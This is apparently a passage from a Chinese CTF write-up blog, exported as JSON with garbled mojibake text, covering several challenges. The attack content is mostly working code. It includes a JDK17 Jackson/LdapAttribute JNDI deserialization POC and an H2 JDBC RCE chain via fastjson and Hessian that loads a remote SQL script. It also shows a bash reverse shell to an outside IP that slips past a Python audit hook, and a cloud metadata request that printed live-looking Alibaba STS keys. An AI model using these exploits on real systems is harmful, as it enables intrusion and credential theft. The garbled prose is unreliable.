deserialize(String data) throws Exception { byte[] base64decodedBytes = Base64.getDecoder().decode(data); ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); } public static void setFieldValue(Object obj, String field, Object arg) throws Exception { Field f = null; Class\u0026lt;?\u0026gt; c = obj.getClass(); for (int i = 0; i \u0026lt; 5; i++) { try { f = c.getDeclaredField(field); } catch (NoSuchFieldException e){ c = c.getSuperclass(); } } f.setAccessible(true); f.set(obj, arg); } public static Object getFieldValue(Object obj, String fieldName) throws Exception{ Field field = null; Class c = obj.getClass(); for (int i = 0; i \u0026lt; 5; i++) { try { field = c.getDeclaredField(fieldName); } catch (NoSuchFieldException e){ c = c.getSuperclass(); } } field.setAccessible(true); return field.get(obj); } } åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè§¦å‘ä»¥ä¸‹æŠ¥é”™\nException in thread \u0026#34;main\u0026#34; java.lang.RuntimeException: com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Invalid type definition for type `com.sun.jndi.ldap.LdapAttribute`: Failed to construct BeanSerializer for [simple type, class com.sun.jndi.ldap.LdapAttribute]: (java.lang.IllegalArgumentException) Failed to call `setAccess()` on Method \u0026#39;getAttributeSyntaxDefinition\u0026#39; (of class `com.sun.jndi.ldap.LdapAttribute`) due to `java.lang.reflect.InaccessibleObjectException`, problem: Unable to make public javax.naming.directory.DirContext com.sun.jndi.ldap.LdapAttribute.getAttributeSyntaxDefinition() throws javax.naming.NamingException accessible: module java.naming does not \u0026#34;opens com.sun.jndi.ldap\u0026#34; to unnamed module @19dc67c2 åŸå› æ˜¯åœ¨jacksonååºåˆ—åŒ–çš„æ—¶å€™è§¦å‘äº†ä¸€ä¸ªæ¨¡å—åŒ–çš„æœºåˆ¶ï¼Œjdk17ä¸­çš„jacksonåœ¨è§¦å‘getterçš„æ—¶å€™ï¼Œéƒ½ä¼šè¿›è¡Œä¸€æ¬¡build\nåœ¨buildæ—¶ä¼šå¯¹property(è°ƒç”¨çš„ç›®çš„ç±»å’Œç›®çš„æ–¹æ³•)æ˜¯å¦publicè¿›è¡Œä¸€æ¬¡åˆ¤æ–­ï¼Œå¦‚æœépublicåˆ™ä¼šè°ƒç”¨setAccessibleæ¥è¿›è¡Œä¸€æ¬¡åå°„è°ƒç”¨\nLdapAttributeç±»ä¸ºprivateç±»\nç„¶åä¾¿è§¦å‘äº†æ¨¡å—åŒ–æœºåˆ¶ï¼Œå¯¼è‡´äº†æŠ¥é”™çš„äº§ç”Ÿ\næ¯”èµ›çš„æ—¶å€™è„‘å­å®•æœºäº†ï¼Œåé¢è‡ªå·±æ€è€ƒçš„æ—¶å€™çªç„¶å°±æƒ³åˆ°äº†ä¸€ä¸ªæœºåˆ¶ï¼šåŠ¨æ€ä»£ç†\nåœ¨å¹³å¸¸çš„æ—¶å€™ï¼Œé¢å¯¹jacksonååºåˆ—åŒ–æ—¶å¤§å®¶éƒ½ä¼šåœ¨å¤–é¢å¥—ä¸€å±‚JdkDynamicAopProxyçš„ä»£ç†ï¼Œç›®çš„æ˜¯ä¸ºäº†ä¿è¯ååºåˆ—åŒ–æ—¶è§¦å‘getterçš„ç¨³å®šæ€§\nåœ¨è¿™é‡Œï¼Œæˆ‘ä»¬çš„ç›®çš„ä¸æ˜¯ç¨³å®šæ€§ï¼Œè€Œæ˜¯é€šè¿‡invokeæ¥ç»•è¿‡jacksonååºåˆ—åŒ–DirContextç±»æ—¶çš„æŠ¥é”™ï¼ŒåŸç†å¦‚ä¸‹\nç”±äºåœ¨å¤–é¢å¥—äº†ä¸€å±‚proxyï¼Œé‚£ä¹ˆjacksonå°±åªä¼šä»åŠ¨æ€ä»£ç†ç±»è§¦å‘getter ç„¶ååˆç”±JdkDynamicAopProxyåŠ¨æ€ä»£ç†ç±»å»è§¦å‘LdapAttributeçš„getter,å› ä¸ºproxyç±»moduleä½äºjava.baseï¼Œæ‰€ä»¥èƒ½å¤Ÿè®¿é—®ä»»æ„åŒ…ä¸‹çš„ç±»è€Œä¸ä¼šè§¦å‘æ¨¡å—åŒ–ï¼Œç„¶åæˆåŠŸè§¦å‘JNDIæ³¨å…¥ æ²¡å¥—proxyæ—¶\nå¥—äº†ä¹‹å\nç„¶ååé¢å°±æ˜¯å¸¸è§„å¥—è·¯æ‰“ELæˆ–è€…æ˜¯SnakeYamläº†ï¼Œè¿™é‡Œä¸åšå¤ªå¤šèµ˜è¿°\nPOC\npackage org.example; import cn.hutool.db.ds.DataSourceWrapper; import com.fasterxml.jackson.databind.ObjectMapper; import com.fasterxml.jackson.databind.node.POJONode; import org.apache.commons.jexl3.JexlBuilder; import org.apache.commons.jexl3.MapContext; import org.h2.jdbcx.JdbcDataSource; import org.h2.message.Trace; import org.springframework.aop.framework.AdvisedSupport; import sun.misc.Unsafe; import javax.naming.CompositeName; import javax.naming.directory.Attribute; import javax.sql.DataSource; import javax.swing.event.EventListenerList; import javax.swing.undo.UndoManager; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.net.URL; import java.util.Base64; import java.util.Vector; import Utils.Util; public class test { public static void main(String[] args) throws Exception { Class\u0026lt;?\u0026gt; unSafe=Class.forName(\u0026#34;sun.misc.Unsafe\u0026#34;); Field unSafeField=unSafe.getDeclaredField(\u0026#34;theUnsafe\u0026#34;); unSafeField.setAccessible(true); Unsafe unSafeClass= (Unsafe) unSafeField.get(null); //è·å–åŸºç±»æ¨¡å— Module baseModule=Object.class.getModule(); Class\u0026lt;?\u0026gt; currentClass=test.class; //è·å–callerç±»çš„module fieldçš„åœ°å€ long addr=unSafeClass.objectFieldOffset(Class.class.getDeclaredField(\u0026#34;module\u0026#34;)); //ç›´æ¥å°†åŸºç±»moduleçš„å€¼è¦†ç›–åœ¨æˆ‘ä»¬çš„åœ°å€ä¸Š unSafeClass.getAndSetObject(currentClass,addr,baseModule); String ldapCtxUrl = \u0026#34;ldap://127.0.0.1:1389/\u0026#34;; Class ldapAttributeClazz = Class.forName(\u0026#34;com.sun.jndi.ldap.LdapAttribute\u0026#34;); Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor( new Class[] {String.class}); ldapAttributeClazzConstructor.setAccessible(true); Object ldapAttribute = ldapAttributeClazzConstructor.newInstance( new Object[] {\u0026#34;name\u0026#34;}); Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField(\u0026#34;baseCtxURL\u0026#34;); baseCtxUrlField.setAccessible(true); baseCtxUrlField.set(ldapAttribute, ldapCtxUrl); Field rdnField = ldapAttributeClazz.getDeclaredField(\u0026#34;rdn\u0026#34;); rdnField.setAccessible(true); rdnField.set(ldapAttribute, new CompositeName(\u0026#34;a//b\u0026#34;)); Proxy proxy= (Proxy) getProxy(ldapAttribute, Attribute.class); System.out.println(Proxy.class.getModule()); POJONode jsonNodes=new POJONode(ldapAttribute); EventListenerList list = new EventListenerList(); UndoManager manager = new UndoManager(); Vector vector = (Vector) getFieldValue(manager, \u0026#34;edits\u0026#34;); vector.add(jsonNodes); setFieldValue(list, \u0026#34;listenerList\u0026#34;, new Object[]{InternalError.class, manager}); System.out.println(Util.serialize(list)); deserialize(serialize(list)); } public static Object getProxy(Object obj,Class\u0026lt;?\u0026gt; clazz) throws Exception { AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(obj); Constructor constructor = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;).getConstructor(AdvisedSupport.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport); Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{clazz}, handler); return proxy; } public static String serialize(Object object) throws IOException { ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(object); oos.close(); return Base64.getEncoder().encodeToString(baos.toByteArray()); } public static void deserialize(String data) throws Exception { byte[] base64decodedBytes = Base64.getDecoder().decode(data); ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); } public static void setFieldValue(Object obj, String field, Object arg) throws Exception { Field f = null; Class\u0026lt;?\u0026gt; c = obj.getClass(); for (int i = 0; i \u0026lt; 5; i++) { try { f = c.getDeclaredField(field); } catch (NoSuchFieldException e){ c = c.getSuperclass(); } } f.setAccessible(true); f.set(obj, arg); } public static Object getFieldValue(Object obj, String fieldName) throws Exception{ Field field = null; Class c = obj.getClass(); for (int i = 0; i \u0026lt; 5; i++) { try { field = c.getDeclaredField(fieldName); } catch (NoSuchFieldException e){ c = c.getSuperclass(); } } field.setAccessible(true); return field.get(obj); } } æœ€å è¿™é¢˜é™¤äº†ä¸Šè¿°æ–¹æ³•è¿˜æœ‰å¾ˆå¤šæ–¹æ³•ï¼Œæ¯”å¦‚fastjsonè§¦å‘Ldapçš„getterï¼Œç„¶åfastjsonå’Œjacksonè¿™ä¿©ä¸œè¥¿ä¹Ÿå¯ä»¥è§¦å‘ä¾èµ–é‡Œçš„OracleCachedRowSetçš„getConnection()æ‰“jndiï¼Œè¿™é‡Œæ”¾ä¸‹ç¯‡æ–‡ç« é‡Œè¯´å§\n","date":"2025-01-20T03:02:14+08:00","permalink":"http://localhost:1313/post/jdk17%E6%89%93jackson+ldapattruibute%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","section":"post","tags":null,"title":"JDK17æ‰“Jackson+LdapAttruibuteååºåˆ—åŒ–"},{"categories":["WP"],"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if 